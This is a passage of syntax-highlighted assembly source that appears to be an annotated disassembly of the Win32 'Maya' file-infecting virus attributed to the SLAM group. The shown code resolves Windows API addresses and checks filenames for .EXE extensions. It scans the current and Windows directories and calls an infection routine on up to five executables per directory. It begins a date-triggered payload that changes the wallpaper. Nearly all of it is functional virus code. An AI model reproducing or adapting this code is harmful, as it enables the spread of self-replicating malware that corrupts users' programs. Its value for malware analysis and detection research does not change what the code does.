    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;plus delta offset</span><span class="sc0">
</span><span class="sc5">maya_lookup_more_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;loop begins here</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get length of name string</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc12">'SHAI'</span><span class="sc0">      </span><span class="sc1">;end of api names?  </span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_more_return</span><span class="sc0">  </span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;skip length of string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;edx points to api name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;save regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_lookup_getmodulehandle</span><span class="sc0">    </span><span class="sc1">;get fn add</span><span class="sc0">
</span><span class="sc1">;this call will fail or virus causes a fault at line 579</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;get regs back</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;get ptr to room for address,after api name</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_lookup_more_nextfn</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;store fn add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">maya_lookup_more_nextfn</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;next</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_lookup_more_loop</span><span class="sc0">
</span><span class="sc5">maya_lookup_more_return</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;@1559</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;the following code is probaly dead</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_deadcode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_calculate_deltaoffset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_extension_check</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_deadcode_skip</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_infect</span><span class="sc0">
</span><span class="sc5">maya_deadcode_skip</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">maya_deadcode_extension_check</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;get filename ptr into esi</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">         </span><span class="sc1">;increase ptrs</span><span class="sc0">
</span><span class="sc5">maya_deadcode_extension_check_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">;fetch character of filename</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;null?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_deadcode_extension_check_ret0</span><span class="sc0">   </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">      </span><span class="sc1">;dot?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_deadcode_extension_check_loop</span><span class="sc0">  </span><span class="sc1">;nope branch to find dot</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc1">;extension check</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_deadcode_extension_check_ret1</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'exe.'</span><span class="sc1">;extension check</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_deadcode_extension_check_ret1</span><span class="sc0">
</span><span class="sc5">maya_deadcode_extension_check_ret0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;return failure</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">maya_deadcode_extension_check_ret1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;return success</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;@159x</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;these calls dont seem to be executed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_movefilea_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_copyfilea_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call3</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_createfilea2_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call4</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deletefilea_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call5</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_setfileattributesa2_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call6</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getfileattributesa2_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call7</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_getfullpathnamea_add</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">maya_deadcode_call8</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_hook</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_createprocessa_add</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">maya_deadcode_hook</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_deadcode_calculate_deltaoffset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">maya_deadcode_calculate_deltaoffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">maya_deadcode_calculate_deltaoffset_plus5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_deadcode_calculate_deltaoffset_plus5</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;file searching routines</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_process_windows_directory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;kill counter</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory</span><span class="sc0"> </span><span class="sc1">;attack current dir again       </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">;inf'd 5 files again?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_windows_directory_return</span><span class="sc0">    </span><span class="sc1">;if so return</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_currdir</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getcurrdir</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_windows_directory_return</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_windir</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getwindir</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_windows_directory_return</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_windir</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_setcurrdir</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_windows_directory_return</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_currdir</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_setcurrdir</span><span class="sc0">
</span><span class="sc5">maya_process_windows_directory_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;return to caller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;routine to scan for and infect files in the current directory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maya_process_current_directory</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc1">;@1674</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_finddata</span><span class="sc0">    </span><span class="sc1">;get add of structure</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_filemask</span><span class="sc0">    </span><span class="sc1">;get add of filemask</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_findfirstfilea_add</span><span class="sc4">]</span><span class="sc1">;get add of FindFirstFileA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;call function</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_return</span><span class="sc1">;yes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_findhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;store handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_finddata._fname</span><span class="sc0"> </span><span class="sc1">;get ptr to filename</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_infect</span><span class="sc0">            </span><span class="sc1">;try to infect file </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_successfull_infection</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;check flag</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_findnext</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc1">;already infected 5 files?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_return</span><span class="sc0"> </span><span class="sc1">;yes so return to caller</span><span class="sc0">
</span><span class="sc5">maya_process_current_directory_findnext</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_finddata</span><span class="sc0">    </span><span class="sc1">;get add of structure</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;store parameter                </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_findhandle</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;store parameter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_findnextfilea_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get add of FindNextFileA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call function</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;found more?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_return</span><span class="sc1">;nope</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_finddata._fname</span><span class="sc0"> </span><span class="sc1">;get filename</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_infect</span><span class="sc0">            </span><span class="sc1">;try to infect file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_successfull_infection</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;inf ok?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_findnext</span><span class="sc0">   </span><span class="sc1">;nope proceed</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;inc counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_infection_counter</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">     </span><span class="sc1">;already 5?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_return</span><span class="sc0">      </span><span class="sc1">;yes return to caller</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">maya_process_current_directory_findnext</span><span class="sc0">   </span><span class="sc1">;nope find more files</span><span class="sc0">
</span><span class="sc5">maya_process_current_directory_return</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">;return to caller</span><span class="sc0">

</span><span class="sc5">maya_payload</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;@1701</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;on the 1st of any month,creates a slam.bmp file containing a SLAM logo</span><span class="sc0">
</span><span class="sc1">;and sets the wallpaper to it.Then displays a messagebox.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getsystime</span><span class="sc0">        </span><span class="sc1">;fill system time structure</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_systime.wday</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;1st of any month?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">         </span><span class="sc1">;nope abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_user32</span><span class="sc0">      </span><span class="sc1">;ptr to 'USER32.dll' string</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">             </span><span class="sc1">;add delta offset</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">maya_getmodhand</span><span class="sc0">            </span><span class="sc1">;get hModule to user32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;failed?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">maya_payload_return</span><span class="sc0">          </span><span class="sc1">;yes abort</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">maya_u32hand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;store hModule to user32</span><span class="sc0">
